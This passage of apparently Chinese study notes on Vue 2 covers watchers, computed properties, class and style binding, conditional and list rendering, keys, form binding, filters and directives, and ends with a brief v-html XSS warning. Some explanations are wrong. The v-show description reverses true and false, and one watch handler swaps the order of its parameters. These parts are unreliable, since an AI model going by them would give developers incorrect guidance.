            console.log(`天气从${oldValue?"炎热":"凉爽"}变成了${newValue?"炎热":"凉爽"}`);
        });
        // 当想要取消监视时
        unwatch(); // 调用这个函数取消监视
    </script>
</body>
```

1. 两种方法：通过通过vm 对象的$watch()或watch 配置来监视指定的属性
    
    > **使用场景**：
    > 
    > `watch` 选项和 `$watch` 方法的主要区别在于它们的用途和灵活性
    > 
    > `watch` 选项是在组件定义内使用的，它适用于在组件生命周期内始终需要监视的数据
    > 
    > 而 `$watch` 方法更加灵活，它可以动态地添加或移除监视器，适用于那些需要根据条件或用户操作来决定是否监视数据的情况
    
2. 当属性变化时, 回调函数自动调用, 在函数内部进行计算
    
3. 注意：【属性名称】，当你使用 `watch` 选项或 `$watch` 方法时，你需要指定你要监视的数据的属性名称。
    
    > 在对象中，这个属性名称应该是一个字符串，即使它是一个变量，也应该放在引号内
    > 
    > 例如，`'isHot'` 而不是 `isHot`
    

#### 1.7.4. 深度监视–deep

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.jsdelivr.net/npm/vue@2.7.16/dist/vue.js"></script>
    <title>Document</title>
</head>
<body>
    <div id="root">
        <h2>a的值是：{{Number.a}}</h2>
        <button @click="count_a()">点击+1</button>
        <hr>
        <h2>b的值是：{{Number.b}}</h2>
        <button @click="count_b()">点击+1</button>
    </div>
    <script>
        const vm = new Vue({
            el: '#root',
            data: {
                Number:{
                    a:1,
                    b:2
                }
            },
            methods: {
                count_a() {
                    this.Number.a++
                },
                count_b() {
                    this.Number.b++
                },
                count(){
                    
                }
            },
            computed: {
            },
            watch: {
                //监视多级结构中某个属性的变化
                    // 不能直接写a，监视不到
                    // 不能写Number,b变也监视a
                    // 需要加上''
                //监视多个(一一列举✖️)
                'Number.a':{
                    handler(oldValue,newValue){
                        console.log('a变了'+(oldValue-newValue));
                    }
                },
                'Number.b':{
                    handler(oldValue,newValue){
                        console.log('b变了'+(oldValue-newValue));
                    }
                },
                //同时监视所有
                'Number':{
                    deep:true,//深度监视配置项
                    handler(){
                        console.log('Number数据变化');
                    }
                }
            }
        })
        
    </script>
</body>

</html>
```

在 Vue 中，`watch` 选项用于监视数据的变化，并根据变化执行特定的逻辑。对于对象类型的数据，**Vue自身可以监测对象内部值的改变**，但提供的**`watch`** 默认情况下只会监视**对象本身**的变化【一层】，而不会监视**对象内部属性**的变更【多层】

想要监视对象内部属性的变更，你需要使用**深度监视（deep watch）**，深度监视通过设置 **`deep: true` 配置项**来实现，这样 Vue 会递归地监视对象内部值的变动

#### 1.7.5. 监视的完整写法与简写

**简写形式**：如果你的监视器**只需要一个 `handler` 函数**，你可以使用简写形式，直接传递一个函数作为监视器的值

```html
<body>
    <div id="root">
        <h2>今天天气很{{ info }}</h2>
        <button @click="change()">点击切换天气</button>
    </div>
    <script>
        const vm = new Vue({
            el: '#root',
            data: {
                isHot: true
            },
            methods: {
                change() {
                    this.isHot = !this.isHot;
                }
            },
            computed: {
                info() {
                    return this.isHot ? '炎热' : '凉爽';
                }
            },
            watch: {
                // 1.完整写法
                    // isHot: {
                    //     deep:true,
                    //     handler(newValue, oldValue) {
                    //         console.log(`天气从${oldValue?"炎热":"凉爽"}变成了${newValue?"炎热":"凉爽"}`);
                    //     }
                    // }
                // 2.简写
                    // isHot:function(newValue, oldValue){
                    //     console.log(`天气从${oldValue?"炎热":"凉爽"}变成了${newValue?"炎热":"凉爽"}`);
                    // }
            }
        })
        // 1.
            // vm.$watch('isHot', {
            //     deep:true,
            //     handler(newValue, oldValue) {
            //         console.log(`天气从${oldValue?"炎热":"凉爽"}变成了${newValue?"炎热":"凉爽"}`);
            //     }
            // });
        // 2.
            vm.$watch('isHot', function(newValue, oldValue) {
                console.log(`天气从${oldValue?"炎热":"凉爽"}变成了${newValue?"炎热":"凉爽"}`);
            });
    </script>
</body>
```

#### 复写案例

使用监视实现

```html
<body>
    <div id="root">
        姓：<input type="text" v-model="xing">
        名：<input type="text" v-model="ming">
        姓名：<span>{{name}}</span>
    </div>
    <script>
        const vm = new Vue({
            el: '#root',
            data: {
                xing: '',
                ming: '',
                name: ''
            },
            methods: {
            },
            computed: {
            },
            watch: {
                xing: {
                    handler(newValue, oldValue) {
                        this.name = newValue + this.ming;
                    }
                },
                ming: {
                    handler(newValue, oldValue) {
                        this.name = this.xing + newValue;
                    }
                }
            }
        })
    </script>
</body>
```

#### 计算属性与监视的选择

**同步与异步**：计算属性无法开启异步任务，面临异步操作需要选择watch

```html
<body>
    <div id="root">
        姓：<input type="text" v-model="xing">
        名：<input type="text" v-model="ming">
        姓名：<span>{{name}}</span>
    </div>
    <script>
        const vm = new Vue({
            el: '#root',
            data: {
                xing: '',
                ming: '',
                name: ''
            },
            // 无法正常显示
            // computed: {
            //     // 计算属性
            //     fullName: {
            //         get() {
            //             return this.xing + ' ' + this.ming;
            //         },
            //         set(value) {
            //             setTimeout(() => {
            //                 this.xing = value.split(' ')[0];
            //                 this.ming = value.split(' ')[1];
            //             }, 500);
            //         }
            //     }
            // },
            watch: {
                // 监视属性
                xing: {
                    handler(newValue, oldValue) {
                        setTimeout(() => {
                            this.name = newValue + ' ' + this.ming;
                        }, 500);
                    }
                },
                ming: {
                    handler(newValue, oldValue) {
                        setTimeout(() => {
                            this.name = this.xing + ' ' + newValue;
                        }, 500);
                    }
                }
            }
        })
    </script>
</body>
```

> 注意：**`setTimeout` 回调函数的执行上下文是由 JavaScript 引擎决定的**，而不是由 Vue 决定的。
> 
> 在 Vue 应用中使用 `setTimeout` 时，需要通过使用箭头函数来定义回调函数，确保其内部正确地绑定 `this` 到 Vue 实例如果使用
> 
> 普通的函数作为 `setTimeout` 的回调函数，`this` 的上下文会指向全局对象（通常是 `window`），而不是 Vue 实例

总结：

1. **所有被Vue管理的函数，最好写成普通函数，这样this的指向才是vm 或 组件实例对象**
    
2. **所有不被Vue所管理的函数（定时器的回调函数、ajax的回调函数等、Promise的回调函数），最好写成箭头函数，这样this的指向才是vm或组件实例对象**
    
3. computed和watch之间的区别：
    
    - computed能完成的功能，watch都可以完成
    - watch能完成的功能，computed不一定能完成，例如：watch可以进行异步操作
4. **最佳实践**：在大多数情况下，你应该**优先考虑使用计算属性**，因为它们更加简洁、易于维护，并且与 Vue 的响应式系统更紧密集成。只有在计算属性不适用时，才考虑使用 `watch` 监听器
    

### 1.8. class 与 style 绑定

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.jsdelivr.net/npm/vue@2.7.16/dist/vue.js"></script>
    <title>Document</title>
    <style>
        .basic{
            width: 400px;
            height: 100px;
            border: 1px solid black;
        }
        .happy{
            border: 4px solid red;;
            background-color: rgba(255, 255, 0, 0.644);
            background: linear-gradient(30deg,yellow,pink,orange,yellow);
        }
        .sad{
            border: 4px dashed rgb(2, 197, 2);
            background-color: gray;
        }
        .normal{
            background-color: skyblue;
        }
    
        .atguigu1{
            background-color: yellowgreen;
        }
        .atguigu2{
            font-size: 30px;
            text-shadow:2px 2px 10px red;
        }
        .atguigu3{
            border-radius: 20px;
        }
    </style>
    
</head>
<body>
    <div id="root">
        <!-- 绑定class样式--字符串写法，适用于：样式的类名不确定，需要动态指定 -->
        <div class="basic" :class="mood" @click="changeMood">{{name}}</div> <br/><br/>
    
        <!-- 绑定class样式--数组写法，适用于：要绑定的样式个数不确定、名字也不确定 -->
        <div class="basic" :class="classArr">{{name}}</div> <br/><br/>
    
        <!-- 绑定class样式--对象写法，适用于：要绑定的样式个数确定、名字也确定，但要动态决定用不用 -->
        <div class="basic" :class="classObj">{{name}}</div> <br/><br/>
    
        <!-- 绑定style样式--对象写法 -->
        <div class="basic" :style="styleObj">{{name}}</div> <br/><br/>
    
        <!-- 绑定style样式--数组写法 -->
        <div class="basic" :style="styleArr">{{name}}</div>
    </div>
    <script type="text/javascript">
        Vue.config.productionTip = false
            
        const vm = new Vue({
            el:'#root',
            data:{
                name:'尚硅谷',
                mood:'normal',
                classArr:['atguigu1','atguigu2','atguigu3'],
                classObj:{
                    atguigu1:false,
                    atguigu2:false,
                },
                styleObj:{
                    fontSize: '40px',
                    color:'red',
                },
                styleObj2:{
                    backgroundColor:'orange'
                },
                styleArr:[
                    {
                        fontSize: '40px',
                        color:'blue',
                    },
                    {
                        backgroundColor:'gray'
                    }
                ]
            },
            methods: {
                changeMood(){
                    const arr = ['happy','sad','normal']
                    const index = Math.floor(Math.random()*3)
                    this.mood = arr[index]
                }
            },
        })
    </script>
</body>
</html>
```

#### 1.8.1. 理解

1. 在应用界面中, 某个(些)元素的样式是变化的
    
2. class/style 绑定就是专门用来实现动态样式效果的技术
    

#### 1.8.2. class 绑定

1. :class=‘xxx’
    
2. 表达式是字符串: ‘classA’
    
3. 表达式是对象: {classA:isA, classB: isB}
    
4. 表达式是数组: [‘classA’, ‘classB’]
    

#### 1.8.3. style 绑定

1. :style=“{ color: activeColor, fontSize: fontSize + ‘px’ }”
    
2. 其中activeColor/fontSize 是data 属性
    

### 1.9. 条件渲染

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.jsdelivr.net/npm/vue@2.7.16/dist/vue.js"></script>
    <title>Document</title>
</head>
<body>
    <div id="root">
        <h2>当前的n值是:{{n}}</h2>
        <button @click="n++">点我n+1</button>

        <h2 v-show="true">Hello,{{name}}!</h2>

        <!-- 中间不能被打断 -->
        <div v-if="n === 1">Angular</div>
        <div v-else-if="n === 2">React</div>
        <div v-else>Vue</div>
    </div>
    <script>
        const vm=new Vue({
            el:'#root',
            data:{
                name:'小黄',
                n:0
            }
        })
    </script>
</body>
</html>
```

#### 1.9.1. 条件渲染指令

1. v-if 与v-else-if与v-else
    
    - 不能在指令之间插入其他元素
    - 如果表达式为 `true`，则元素会被渲染；如果表达式为 `false`，则元素不会被渲染，并且不会占据任何空间
2. v-show
    
    - 如果表达式为 `true`，则元素会被渲染，并且通过 CSS 属性 `display: none;` 隐藏；如果表达式为 `false`，则元素会被渲染，并且通过 CSS 属性 `display: block;` 显示
    - 元素始终会被渲染，只是通过 CSS 控制其显示与隐藏

#### 1.9.2. 比较v-if 与v-show

1. **性能考虑**：
    
    如果需要**频繁切换 v-show** 较好，**不经常变化使用 `v-if`**
    
2. **初始渲染**：
    
    `v-if` 不会在初始渲染时添加元素，只有当条件满足时才会添加
    
    `v-show` 会在初始渲染时添加元素，并立即通过 CSS 控制其显示与隐藏
    
3. **过渡效果**：
    
    `v-show` 可以与 CSS 过渡效果配合使用，从而实现平滑的显示与隐藏效果
    
    `v-if` 则不会有过渡效果，因为它在条件不成立时会直接移除元素
    
4. **使用`v-if`的时，元素可能无法获取到，而使用`v-show`一定可以获取到**
    

#### 1.9.3. template

```html
<template>
	<div>
        <!--  -->
        <p v-if="n===10">你好</p>
        <p v-if="n===10">Hello</p>
        <p v-if="n===10">hi！</p>
        <!--  -->
        <div v-if="n===15">
            <p>你好</p>
            <p>hello</p>
            <p>hi~</p>
        </div>
        <!--  -->
        <template v-if="n===5">
            <p>你好</p>
            <p>hello</p>
            <p>hi~</p>
        </template>
	</div>
    <script>
        const vm=new Vue({
            el:'#root',
            data:{
                n:0
            }
        })
    </script>
</template>
```

1. 当需要对多个元素应用相同的条件时，直接在每个元素上使用多个 `v-if` 指令可能会导致性能问题，因为每次条件改变时，Vue 都需要重新计算每个 `v-if` 的结果
    
2. 想到当需要对多个元素应用相同的条件时，直接在每个元素上使用多个 `v-if` 指令可能会导致性能问题，因为每次条件改变时，Vue 都需要重新计算每个 `v-if` 的结果；然而，直接使用 `div` 包裹多个元素可能会影响代码的结构
    
3. 于是选择使用`template` 元素，它可以用来包裹多个 `v-if` 条件
    

##### 基本用法：

- **组织 HTML 结构**：可以将任何 HTML 结构包裹在 `template` 元素中，Vue 会将这些结构视为模板的一部分
- **嵌套结构**：`template` 元素可以嵌套在其他 `template` 元素中，形成多层嵌套的模板结构
- **动态内容**：通过在 `template` 元素中使用 Vue 指令（如 `v-if`、`v-for`、`v-bind` 等），你可以实现复杂的动态内容
- **可复用性**：`template` 元素可以作为组件的一部分，并在其他组件中复用

### 1.10. 列表渲染

#### 1.10.1. 效果

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.jsdelivr.net/npm/vue@2.7.16/dist/vue.js"></script>
    <title>Document</title>
</head>
<body>
    <div id="root">
        <h2>人员列表</h2>
        <!-- 遍历数组 -->
            <!-- 1. 普通写法 -->
                <!-- <ul>
                    <li>{{personArr[0].name}}-{{personArr[0].age}}</li>
                    <li>{{personArr[1].name}}-{{personArr[1].age}}</li>
                    <li>{{personArr[2].name}}-{{personArr[2].age}}</li>
                </ul> -->
            <!-- 2. v-for -->
            <ul>
                <li v-for="person in personArr" :key="person.id">
                    {{person.name}}-{{person.age}}
                </li>
            </ul>
            <!-- 3.  -->
            <ul>
                <li v-for="(person, index) in personArr" :key="index">
                    {{index + 1}}. {{person.name}}-{{person.age}}
                </li>
            </ul>
        <!-- 遍历对象 -->
            <ul>
                <li v-for="(value,key) in obj" :key="key">
                    {{key}}:{{value}}
                </li>
            </ul>
        <!-- 遍历字符串(少用) -->
            <ul>
                <li v-for="(item,index) in str" :key="index">
                    {{index}}--{{item}}
                </li>
            </ul>
        <!-- 测试遍历指定次数(少用) -->
        <ul>
            <li v-for="(number, index) of 10" :key="index">
                {{index}}---{{number}}
            </li>
        </ul>        
    </div>
    <script>
        const vm=new Vue({
            el:'#root',
            data:{
                // 数组
                personArr:[
                    {
                        id:'001',
                        name:'张三',
                        age:20
                    },
                    {
                        id:'002',
                        name:'李四',
                        age:18
                    },
                    {
                        id:'003',
                        name:'王五',
                        age:21
                    }
                ],
                // 对象
                obj:{
                    student:'小黄',
                    study:'Vue',
                    tiem:'1week'
                },
                // 字符串
                str:'hello,好好学习天天向上'
            },
        })
    </script>
</body>
</html>
```

#### **1.10.2.** **列表显示指令**

- **遍历数组**：
    - `v-for="person in personArr"`：用于遍历数组，并渲染数组中的每个元素
    - `v-for="(person, index) in personArr"`：用于遍历数组，并使用 `person` 变量代表当前元素，使用 `index` 变量代表当前元素的索引
- **遍历对象**：
    - `v-for="(value, key) in obj"`：用于遍历对象，并渲染每个键值对

> 可遍历：数组、对象、字符串（用的少）、指定次数（用的少）

#### **1.10.3.** **key的作用与原理**

案例：

```html
<body>
    <div id="root">
        <h2>人员列表</h2>
        <button @click.once="add">添加老刘</button>
        <ul>
            <!-- 1. index(出问题) -->
            <!-- <li v-for="(p,index) in persons" :key="index"> -->
            <!-- 2. 不写(出问题) --> 
            <!-- <li v-for="(p,index) in persons" :key="index"> -->
            <!-- 3. p.id(没问题) -->
            <li v-for="(p,index) in persons" :key="p.id">
                {{p.name}} - {{p.age}}
                <input type="text">
            </li>
        </ul>
    </div>
    <script>
        const vm=new Vue({
            el:'#root',
            data:{
				persons:[
					{id:'001',name:'张三',age:18},
					{id:'002',name:'李四',age:19},
					{id:'003',name:'王五',age:20}
				]
			},
			methods: {
				add(){
					const p = {id:'004',name:'老刘',age:40}
					this.persons.unshift(p)//数据添加到数组首位
				}
			},
        })
    </script>
</body>
```

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/68f8a868ca6e84357440ddefc5579e00.png#pic_center)  
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/9d576e607bc3024633509d3ab8fc6db2.png#pic_center)

**面试题**：react、vue中的key有什么作用？（key的内部原理）

1. 虚拟DOM中key的作用：key是虚拟DOM中对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】，随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下：
2. 对比规则：
    1. 旧虚拟DOM中找到了与新虚拟DOM相同的key：
        1. 若虚拟DOM中内容没变, 直接使用之前的真实DOM
        2. 若虚拟DOM中内容变了, 则生成新的真实DOM，随后替换掉页面中之前的真实DOM
    2. 旧虚拟DOM中未找到与新虚拟DOM相同的key：创建新的真实DOM，随后渲染到到页面
3. 用index作为key可能会引发的问题：
    1. 若对数据进行逆序添加、逆序删除等破坏顺序操作：会产生没有必要的真实DOM更新 ==> 界面效果没问题, 但效率低
    2. 若结构中还包含输入类的DOM：会产生错误DOM更新 ==> 界面有问题
4. 开发中如何选择key?
    1. 最好使用每条数据的唯一标识作为key，比如id、手机号、身份证号、学号等唯一值
    2. 如果不存在对数据的逆序添加、逆序删除等破坏顺序的操作，仅用于渲染列表，使用index作为key是没有问题的

#### 列表过滤

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.jsdelivr.net/npm/vue@2.7.16/dist/vue.js"></script>
    <title>Document</title>
</head>
<body>
    <div id="root">
        <input placeholder="请输入姓名" v-model="keyWord">
        <ul>
            <li v-for="(item,index) in filteredPersonArr" :key="index">
                {{item.name}}--{{item.age}}
            </li>
        </ul>
    </div>
    <!-- 1. 计算属性 -->
    <!-- <script>
        const vm=new Vue({
            el:'#root',
            data:{
                keyWord:'',
                personArr:[
                    {id:'001',name:'小黄',age:18,gender:'女'},
                    {id:'002',name:'废废',age:20,gender:'男'},
                    {id:'003',name:'小黑',age:22,gender:'男'},
                    {id:'004',name:'笨笨',age:21,gender:'女'},
                ]
            },
            computed: {
                filteredPersonArr() {
                    return this.personArr.filter((person) => {
                        return person.name.indexOf(this.keyWord) !== -1;
                    });
                }
            }
        })
    </script> -->
    
    <!-- 2. watch监听 -->
    <script>
        const vm=new Vue({
            el:'#root',
            data:{
                keyWord:'',
                personArr:[
                    {id:'001',name:'小黄',age:18,gender:'女'},
                    {id:'002',name:'废废',age:20,gender:'男'},
                    {id:'003',name:'小黑',age:22,gender:'男'},
                    {id:'004',name:'笨笨',age:21,gender:'女'},
                ],
                filteredPersonArr: []
            },
            watch: {
                keyWord:{
                    immediate:true,
                    handler(value) {
                        this.filteredPersonArr = this.personArr.filter((person) => {
                            return person.name.indexOf(value) !== -1;
                        });
                    }
                }
            }
        })
    </script>
    
</body>
</html>
```

#### 拓展：折叠代码块

使用 `#region` 和 `#endregion` 标记来折叠代码块

#### 列表排序

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.jsdelivr.net/npm/vue@2.7.16/dist/vue.js"></script>
    <title>Document</title>
</head>
<body>
    <div id="root">
        <input placeholder="请输入姓名" v-model="keyWord">
        <ul>
            <li v-for="(item,index) in filteredPersonArr" :key="index">
                {{item.name}}--{{item.age}}--{{item.gender}}
            </li>
        </ul>
        <button @click="sortType=0">原顺序</button>
        <button @click="sortType=1">按年龄升序排序</button>
        <button @click="sortType=2">按年龄降序排序</button>
    </div>
    <!-- <script>
        const vm=new Vue({
            el:'#root',
            data:{
                keyWord:'',
                sortType:0,//0原顺序 1降序 2升序
                personArr:[
                    {id:'001',name:'小黄',age:18,gender:'女'},
                    {id:'002',name:'废废',age:20,gender:'男'},
                    {id:'003',name:'小黑',age:22,gender:'男'},
                    {id:'004',name:'笨笨',age:21,gender:'女'},
                ],
            },
            computed: {
                filteredPersonArr() {
                    const arr = this.personArr.filter((person) => {
                        return person.name.indexOf(this.keyWord) !== -1;
                    })
                    if(this.sortType){
                        arr.sort((a,b)=>{
                            return this.sortType===1?(b.age-a.age):(a.age-b.age)
                            // 前减后,升序; 后减前,降序
                        })
                    }
                    return arr
                }
            }
        })
    </script> -->
    <script>
        const vm=new Vue({
            el:'#root',
            data:{
                keyWord:'',
                sortType:0,//0原顺序 1降序 2升序
                personArr:[
                    {id:'001',name:'小黄',age:18,gender:'女'},
                    {id:'002',name:'废废',age:20,gender:'男'},
                    {id:'003',name:'小黑',age:22,gender:'男'},
                    {id:'004',name:'笨笨',age:21,gender:'女'},
                ],
            },
            computed: {
                filteredPersonArr() {
                    const arr = this.personArr.filter((person) => {
                        return person.name.indexOf(this.keyWord) !== -1;
                    });
                    if(this.sortType) {
                        arr.sort((a, b) => {
                            return this.sortType === 1 ? b.age - a.age : a.age - b.age;
                        });
                    }
                    return arr;
                }
            }
        })
    </script>
</body>
</html>
```

#### Vue数据监视

##### 案例

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.jsdelivr.net/npm/vue@2.7.16/dist/vue.js"></script>
    <title>Document</title>
</head>
<body>
    <div id="root">
        <h2>人员列表</h2>
        <ul>
            <li v-for="(person,index) in personArr" :key="person.id">
                {{person.name}}--{{person.age}}--{{person.gender}}
            </li>
        </ul>
        <button @click="updataBlack()">点击更新小黑的信息</button>
    </div>
    <script>
        const vm=new Vue({
            el:'#root',
            data:{
                personArr:[
                    {id:'001',name:'小黄',age:18,gender:'女'},
                    {id:'002',name:'废废',age:20,gender:'男'},
                    {id:'003',name:'小黑',age:22,gender:'男'},
                    {id:'004',name:'笨笨',age:21,gender:'女'},
                ]
            },
            methods: {
                updataBlack(){
                    // 1. 可以奏效的方法
                    // this.personArr[2].age=27

                    // 2. 无法奏效的方法
                    // 点击按钮 页面元素不变,开发者工具监测不到数据变化,但是通过控制台查看实例可以看到数据改变
                    this.personArr[2]={id:'003',name:'小黑',age:27,gender:'男'}
                }
            },
        })
    </script>
</body>
</html>
```

bug：

1. 若已经实现打开开发者工具，再点击按钮，则页面元素不变，开发者工具监测不到数据变化，但是通过控制台查看实例可以看到数据改变
2. 若先点击按钮，再打开开发者工具，则页面元素不变，开发者工具可以监测到数据变化

##### 原理

###### 1. Vue如何检测对象数据的改变

```html
<body>
    <div id="root">
        <h2>学校名称:{{name}}</h2>
        <h2>学校地址:{{address}}</h2>
    </div>
    <script>
        const vm=new Vue({
            el:'#root',
            data:{
                name:'尚硅谷',
                address:'北京'
            },
        })
    </script>
</body>
```

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/e412707a4a9681c27e855c92ff35a1bb.png#pic_center)

底层原理：

1. 拿到data数据对象
2. 加工：写getter和setter方法（响应式的）
3. 编写 _data

当属性值被访问时，会触发getter方法，这时Vue会将当前的Watcher对象（即订阅者）存储起来，用于后续数据变化时的更新操作。

当属性值被修改时，会触发setter方法，setter方法会**通知所有的Watcher对象进行更新操作**

模拟一个数据检测（蒙圈🥲）

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.jsdelivr.net/npm/vue@2.7.16/dist/vue.js"></script>
    <title>Document</title>
</head>
<body>
    <script>
        let data={
            name:'尚硅谷',
            // address:'北京'
        }
        
        // Object.defineProperty(data, 'name', {
        // 死循环(错误)
        //     get() {
        //         return data.name;
        //     },
        //     set(val) {
        //         data.name = val;
        //     }
        // });

        // 正确代码
            // 创建一个监视的实例对象,用于监视data中属性的变化
            const obs=new Observer(data)
            console.log(obs)

            // 准备一个vm实例对象
            let vm={}
            vm._data=data=obs

            function Observer(obj){
                // 汇总对象中所有的属性形成一个数组
                const keys=Object.keys(obj)
                // 遍历
                keys.forEach((k)=>{
                    Object.defineProperty(this,k,{
                        get(){
                            return obj[k]
                        },
                        set(val){
                            console.log(`${k}被改了，我要去解析模板，生成虚拟DOM.....我要开始忙了`)
                            obj[k]=val
                        }
                    })
                })
            }
    </script>
</body>
</html>
```

###### 2. Vue如何检测数组数据的改变

### 1.11. 收集表单数据

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.jsdelivr.net/npm/vue@2.7.16/dist/vue.js"></script>
    <title>Document</title>
</head>
<body>
    <div id="root">
        <form @submit.prevent="demo">
            账号：<input type="text" v-model.trim="userInfo.account"> <br/><br/>
            密码：<input type="password" v-model="userInfo.password"> <br/><br/>
            年龄：<input type="number" v-model.number="userInfo.age"> <br/><br/>
            性别：
            男<input type="radio" name="sex" v-model="userInfo.sex" value="male">
            女<input type="radio" name="sex" v-model="userInfo.sex" value="female"> <br/><br/>
            爱好：
            学习<input type="checkbox" v-model="userInfo.hobby" value="study">
            打游戏<input type="checkbox" v-model="userInfo.hobby" value="game">
            吃饭<input type="checkbox" v-model="userInfo.hobby" value="eat">
            <br/><br/>
            所属校区：
            <select v-model="userInfo.city">
                <option value="">请选择校区</option>
                <option value="beijing">北京</option>
                <option value="shanghai">上海</option>
                <option value="shenzhen">深圳</option>
                <option value="wuhan">武汉</option>
            </select>
            <br/><br/>
            其他信息：
            <textarea v-model.lazy="userInfo.other"></textarea> <br/><br/>
            <input type="checkbox" v-model="userInfo.agree">阅读并接受<a href="http://www.atguigu.com">《用户协议》</a>
            <button>提交</button>
        </form>
    </div>
    <script>
        const vm=new Vue({
            el:'#root',
            data:{
				userInfo:{
					account:'',
					password:'',
					age:0,
					sex:'female',
					hobby:[],
					city:'beijing',
					other:'',
					agree:''
				}
			},
			methods: {
				demo(){
					console.log(JSON.stringify(this.userInfo))
				}
			}
        })
    </script>
</body>
</html>
```

**总结：**

收集表单数据：

- 若：`<input type="text"/>`，则`v-model`收集的是value值，用户输入的内容就是value值
- 若：`<input type="radio"/>`，则`v-model`收集的是value值，且要给标签配置value属性
- 若：`<input type="checkbox"/>`
    - 没有配置value属性，那么收集的是checked属性（勾选 or 未勾选，是布尔值）
    - 配置了value属性：
        - `v-model`的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）
        - `v-model`的初始值是数组，那么收集的就是value组成的数组

`v-model`的三个修饰符：

1. lazy：失去焦点后再收集数据
2. number：输入字符串转为有效的数字
3. trim：输入首尾空格过滤

### **1.12.** **过滤器**

[BootCDN - Bootstrap 中文网开源项目免费 CDN 加速服务](https://www.bootcdn.cn/)

#### 1.12.1. 效果

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.jsdelivr.net/npm/vue@2.7.16/dist/vue.js"></script>
    <!-- 引入 dayjs 库 -->
    <script src="https://cdn.jsdelivr.net/npm/dayjs"></script>
    <title>Document</title>
</head>
<body>
    <div id="root">
        <h2>时间</h2>
        <h3>当前时间戳：{{time}}</h3>
        <h3>转换后时间：{{ fmtTime }}</h3>
        <h3>转换后时间：{{ getFmtTime() }}</h3>
        <h3>转换后时间：{{time | timeFormater()}}</h3>
        <h3>转换后时间：{{time | timeFormater('YYYY-MM-DD HH:mm:ss')}}</h3>
        <h3>截取年月日：{{time | timeFormater() | mySlice}}</h3>
    </div>
    <script>
        //全局过滤器
        Vue.filter('mySlice',function(value){
            return value.slice(0,11)
        })
        const vm=new Vue({
            el:'#root',
            data:{
                time:1626750147900,
            },
            computed:{
                fmtTime(time){
                    return dayjs(this.time).format('YYYY-MM-DD HH:mm:ss')
                }
            },
            methods: {
                getFmtTime(time){
                    return dayjs(this.time).format('YYYY.MM.DD HH:mm:ss')
                }
            },
            //局部过滤器
            filters:{
                timeFormater(value, str="YYYY年MM月DD日 HH:mm:ss"){
                    return dayjs(value).format(str)
                }
            }
        })
    </script>
</body>
</html>
```

**总结：**

过滤器：

- 定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）。
- 语法：
    1. 注册过滤器：`Vue.filter(name,callback)` 或 `new Vue{filters:{}}`
    2. 使用过滤器：`{{ xxx | 过滤器名}}` 或 `v-bind:属性 = "xxx | 过滤器名"`
- 备注：
    1. 过滤器可以接收额外参数，多个过滤器也可以串联
    2. 并没有改变原本的数据，而是产生新的对应的数据

> 过滤器的优点在于全局引用全局使用
> 
> but，filters过滤器已从Vue 3.0中删除,不再支持

#### **1.12.2.** **理解过滤器**

1. 功能: 对要显示的数据进行特定格式化后再显示
    
2. 注意: 并没有改变原本的数据, 是产生新的对应的数据
    

### 1.13. 内置指令与自定义指令

#### 常用内置指令

1. v-text : 更新元素的 textContent
    
    - 作用：向其所在的节点中渲染文本内容
    - 与插值语法的区别：`v-text`会替换掉节点中的内容，`{{xx}}`则不会
    
    ```html
    <body>
        <div id="root">
            <!-- 插值语法较为灵活 -->
            <div>你好，{{name}}</div><br>
    
            <!-- 无法进行拼接,直接替换内容 -->
            <div v-text="name">你好,</div><br>
    
            <!-- 无法解析标签 -->
            <div v-text="str"></div>
        </div>
        <script>
            const vm=new Vue({
                el:'#root',
                data:{
                    name:'小黄',
                    str:'<h2>hey!你在干什么呢</h2>'
                },
            })
        </script>
    </body>
    ```
    
2. v-html : 更新元素的 innerHTML
    
    ```html
    <body>
        <div id="root">
            <div>你好，{{name}}</div>
    
            <!-- 可以解析标签 -->
            <div v-html="str"></div>
        </div>
        <script>
            const vm=new Vue({
                el:'#root',
                data:{
                    name:'小黄',
                    str:'<h2>hey!你在干什么呢</h2>'
                },
            })
        </script>
    </body>
    ```
    
3. v-if : 如果为true, 当前标签才会输出到页面
    
4. v-else: 如果为false, 当前标签才会输出到页面
    
5. v-show : 通过控制display 样式来控制显示/隐藏
    
6. v-for : 遍历数组/对象
    
7. v-on : 绑定事件监听, 一般简写为@
    
8. v-bind : 绑定解析表达式, 可以省略v-bind
    
9. v-model : 双向数据绑定
    
10. v-cloak : 防止闪现, 与css 配合: [v-cloak] { display: none }
    

#### 安全性问题cookie：

**==严重注意：`v-html`有安全性问题！！==**！

1. 在网站上动态渲染任意HTML是非常危险的，容易导致**XSS攻击**
